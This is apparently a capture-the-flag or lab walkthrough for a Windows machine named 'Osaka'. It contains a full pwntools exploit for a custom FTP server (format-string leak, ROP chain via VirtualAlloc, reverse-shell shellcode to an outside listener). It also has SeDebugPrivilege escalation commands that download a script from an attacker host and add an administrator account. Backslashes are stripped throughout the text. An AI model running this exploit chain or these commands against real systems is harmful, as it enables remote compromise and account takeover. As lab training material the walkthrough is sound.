Osaka Walkthrough
=================

Portscan:

    Nmap scan report for 172.16.201.152
    Host is up (0.29s latency).
    Not shown: 994 closed ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3389/tcp open  ms-wbt-server
    5357/tcp open  wsdapi
    

Find a custom FTP Running on Port 21 (Note that it can take up to ~50s after a portscan to be reachable, since the scan itself can affect the binary):

    Connected to 172.16.201.152.
    220 Welcome to Simple FTP Server
    Name (172.16.201.152:xct): xct
    331 User OK, password required
    Password: 
    230 Login successful
    Remote system type is VulnOS.
    ftp> ls
    500 PASV is not supported
    200 PORT Command successful.
    150 Opening ASCII mode data connection.
     Volume in drive C has no label.
     Volume Serial Number is 80CF-7607
    
     Directory of C:dev
    
    05/11/2023  01:03 PM    <DIR>          .
    05/11/2023  01:03 PM    <DIR>          ..
    05/11/2023  12:25 PM                29 dev.txt
    05/11/2023  12:16 PM           158,208 ftp.exe
                   2 File(s)        158,237 bytes
                   2 Dir(s)  23,881,920,512 bytes free
    226 File transfer complete.
    ftp> 
    

This shows the ftpserver itself & a text file inside the ftp root. Note that any login will work. We download the ftp.exe binary for local analysis.

    ftp> binary
    200 Command OK.
    ftp> get ftp.exe
    local: ftp.exe remote: ftp.exe
    500 PASV is not supported
    200 PORT Command successful.
    150 Opening Binary mode data connection.
       154 KiB   44.43 KiB/s 
    226 File transfer complete.
    158208 bytes received in 00:03 (44.43 KiB/s)
    ftp>  
    

Local analysis will reveal that this server supports a "DEBUG" command which is vulnerable to a format string attack. We use it to leak the binaries base address and thus defeat ASLR.

We also notice that the "RETR" command that allows to retrieve files is vulnerable to a buffer overflow. We can not just send shellcode since DEP is enabled - the stack is not executeable. Using ROP we build a chain to give us a executeable memory for our shellcode via VirtualAlloc and then execute it.

Full exploit:

    from pwn import *
    
    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.9.1.15 LPORT=443 -f  python -v sc
    sc =  b""
    sc += b"xfcxe8x82x00x00x00x60x89xe5x31xc0x64"
    sc += b"x8bx50x30x8bx52x0cx8bx52x14x8bx72x28"
    sc += b"x0fxb7x4ax26x31xffxacx3cx61x7cx02x2c"
    sc += b"x20xc1xcfx0dx01xc7xe2xf2x52x57x8bx52"
    sc += b"x10x8bx4ax3cx8bx4cx11x78xe3x48x01xd1"
    sc += b"x51x8bx59x20x01xd3x8bx49x18xe3x3ax49"
    sc += b"x8bx34x8bx01xd6x31xffxacxc1xcfx0dx01"
    sc += b"xc7x38xe0x75xf6x03x7dxf8x3bx7dx24x75"
    sc += b"xe4x58x8bx58x24x01xd3x66x8bx0cx4bx8b"
    sc += b"x58x1cx01xd3x8bx04x8bx01xd0x89x44x24"
    sc += b"x24x5bx5bx61x59x5ax51xffxe0x5fx5fx5a"
    sc += b"x8bx12xebx8dx5dx68x33x32x00x00x68x77"
    sc += b"x73x32x5fx54x68x4cx77x26x07xffxd5xb8"
    sc += b"x90x01x00x00x29xc4x54x50x68x29x80x6b"
    sc += b"x00xffxd5x50x50x50x50x40x50x40x50x68"
    sc += b"xeax0fxdfxe0xffxd5x97x6ax05x68x0ax09"
    sc += b"x01x0fx68x02x00x01xbbx89xe6x6ax10x56"
    sc += b"x57x68x99xa5x74x61xffxd5x85xc0x74x0c"
    sc += b"xffx4ex08x75xecx68xf0xb5xa2x56xffxd5"
    sc += b"x68x63x6dx64x00x89xe3x57x57x57x31xf6"
    sc += b"x6ax12x59x56xe2xfdx66xc7x44x24x3cx01"
    sc += b"x01x8dx44x24x10xc6x00x44x54x50x56x56"
    sc += b"x56x46x56x4ex56x56x53x56x68x79xccx3f"
    sc += b"x86xffxd5x89xe0x4ex56x46xffx30x68x08"
    sc += b"x87x1dx60xffxd5xbbxf0xb5xa2x56x68xa6"
    sc += b"x95xbdx9dxffxd5x3cx06x7cx0ax80xfbxe0"
    sc += b"x75x05xbbx47x13x72x6fx6ax00x53xffxd5"
    
    
    # Login
    p = remote('192.168.235.129', 21, level='debug')
    p.recvuntil("220 Welcome to Simple FTP Server")
    p.sendline("USER admin")
    p.recvuntil("331 User OK, password required")
    p.sendline("PASS admin")
    p.recvuntil("230 Login successful")
    
    # Leak Base Addresss for ROP
    p.sendline(b"DEBUG "+b"%x|"*100)
    leak = p.recvlines(numlines=2)[-1][6:]
    leak = leak.split(b"|")
    leak_pie = int(leak[0],16)
    leak_ntdll = int(leak[4],16)
    
    bin_base = leak_pie - 0x10f0
    print(f"Binary Base:   {hex(bin_base)}")
    
    total = 1000
    
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
          0xe145 + bin_base,  # POP EBP # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0xe145 + bin_base,  # skip 4 bytes [SimpleFTP.exe] ** REBASED ** ASLR
          #[---INFO:gadgets_to_set_ebx:---]
          0x1d5a9 + bin_base,  # POP EBX # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x1,  # 0x00000001-> ebx
          #[---INFO:gadgets_to_set_edx:---]
          0x1bd7e + bin_base,  # POP EDX # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x1000,  # 0x00001000-> edx
          #[---INFO:gadgets_to_set_ecx:---]
          0x11a2b + bin_base,  # POP ECX # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x40,  # 0x00000040-> ecx
          #[---INFO:gadgets_to_set_edi:---]
          0x4667 + bin_base,  # POP EDI # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x4682 + bin_base,  # RETN (ROP NOP) [SimpleFTP.exe] ** REBASED ** ASLR
          #[---INFO:gadgets_to_set_esi:---]
          0x1dff + bin_base,  # POP ESI # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x14adb + bin_base,  # JMP [EAX] [SimpleFTP.exe]
          0x1d2bf + bin_base,  # POP EAX # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          0x1e008 + bin_base,  # ptr to &VirtualAlloc() [IAT SimpleFTP.exe] ** REBASED ** ASLR
          #[---INFO:pushad:---]
          0x10d6 + bin_base,  # PUSHAD # RETN [SimpleFTP.exe] ** REBASED ** ASLR 
          #[---INFO:extras:---]
          0x10da + bin_base,  # ptr to 'jmp esp' [SimpleFTP.exe] ** REBASED ** ASLR
        ]
    
    rop = b""
    for g in rop_gadgets:
    	print(hex(g))
    	rop += p32(g)
    
    print("Press any key to send")
    input()
    
    buf = b""
    buf += b"A"*(268+4)
    buf += rop
    buf += b"x90"*10
    buf += sc
    buf += b"B"*(total-len(buf))
    p.sendline(b"RETR "+buf+b"
    ")
    

After sending the exploit we get a shell (this was 100% reliable in testing):

    Listening on 0.0.0.0 443
    Connection received on 172.16.201.152 49680
    Microsoft Windows [Version 10.0.17763.4252]
    (c) 2018 Microsoft Corporation. All rights reserved.
    
    C:dev>whoami 
    whoami 
    osakawilson
    
    whoami /priv
    
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                  Description                                   State   
    =============================== ============================================= ========
    SeLoadDriverPrivilege           Load and unload device drivers                Disabled
    SeDebugPrivilege                Debug programs                                Enabled 
    SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled 
    SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
    SeIncreaseWorkingSetPrivilege   Increase a process working set                Disabled
    

We notice the user has the SeDebug- and SeLoadDriverPrivilege. We can exploit both of them, here I will show the Debug variant:

    wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
    iwr http://10.9.1.15:8000/psgetsys.ps1 -o psgetsys.ps1
    
    import-module .psgetsys.ps1
    Get-Process winlogon # note the pid and use it below
    [MyProcess]::CreateProcessFromParent("544","c:windowssystem32cmd.exe", "/c net user offsec Start123! /add")
    [MyProcess]::CreateProcessFromParent("544","c:windowssystem32cmd.exe", "/c net localgroup administrators offsec /add")
    

This adds a new administrator user with which we connect via RDP to read the proof flag.

Close
